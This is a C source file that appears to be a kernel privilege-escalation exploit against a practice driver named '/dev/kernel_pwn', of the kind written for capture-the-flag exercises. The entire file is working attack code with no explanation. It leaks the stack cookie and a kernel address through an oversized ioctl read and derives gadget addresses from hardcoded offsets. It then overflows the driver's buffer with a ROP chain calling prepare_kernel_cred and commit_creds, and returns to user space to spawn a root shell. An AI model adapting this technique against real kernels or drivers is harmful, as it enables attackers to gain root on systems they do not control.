#include "main.h"

uint64_t cookie = 0;
uint64_t kaslr_leak = 0;
uint64_t commit_creds = 0;
uint64_t prepare_kernel_creds = 0;
uint64_t pop_rdi = 0; // pop rdi; ret
uint64_t mov_rdi_rax = 0;
uint64_t xor_r15 = 0;
uint64_t swapgs = 0;
uint64_t iretq = 0;

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(void)
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3;\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        :
        : "memory");
};

size_t write_(uint8_t* data, uint32_t size) 
{
    u_req * req = (u_req*) malloc(sizeof(u_req));
    req->data = data;
    req->size = size;
    size_t err = ioctl(fd, WRITE, req);
    free(req);
    return err;
}

size_t read_(uint8_t* data, uint32_t size)
{
    u_req * req = (u_req*) malloc(sizeof(u_req));
    req->data = data;
    req->size = size;
    size_t err = ioctl(fd, READ, req);
    free(req);
    return err;
}

void setup(void) {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    fd = open("/dev/kernel_pwn", 0);

    if (fd < 0) {
        printf("{-} Error in device open, err = %d\n", fd);
        exit(0);
    }
}

void leak_addrs()
{
    uint8_t* leak_buffer = (uint8_t*) malloc(512+128);
    uint64_t* pBuf = (uint64_t*)(leak_buffer);

    int err = read_(leak_buffer, 512+128);

    cookie = pBuf[64];
    kaslr_leak = pBuf[71]; // ret addr
    commit_creds = kaslr_leak - 0x2b2255;
    prepare_kernel_creds = kaslr_leak - 0x2b1f95;
    pop_rdi = kaslr_leak - 0x3708fc;
    mov_rdi_rax = kaslr_leak + 0x29378f; //-0xafa6f;
    xor_r15 = kaslr_leak - 0x30fb59;
    swapgs = kaslr_leak + 0xa76637;
    iretq = kaslr_leak + 0xa76572;

}
void binsh() 
{
    system("/bin/sh");
}

void attack() 
{
    save_state();
    uint64_t payload[128];
    memset(payload, 0, 128*sizeof(uint64_t));
    payload[64] = cookie;
    payload[71] = pop_rdi;
    payload[72] = 0x0;
    payload[73] = prepare_kernel_creds;
    payload[74] = xor_r15;
    payload[75] = mov_rdi_rax;
    payload[76] = commit_creds;
    payload[77] = swapgs;
    payload[78] = 0;
    payload[79] = iretq;
    payload[80] = &binsh;
    payload[81] = user_cs;
    payload[82] = user_rflags;
    payload[83] = user_sp;
    payload[84] = user_ss;

    write_((void*)payload, 85*sizeof(uint64_t));
}

int main() 
{
    signal(SIGSEGV, binsh);
    setup();
    leak_addrs();
    attack();

    return 0;
}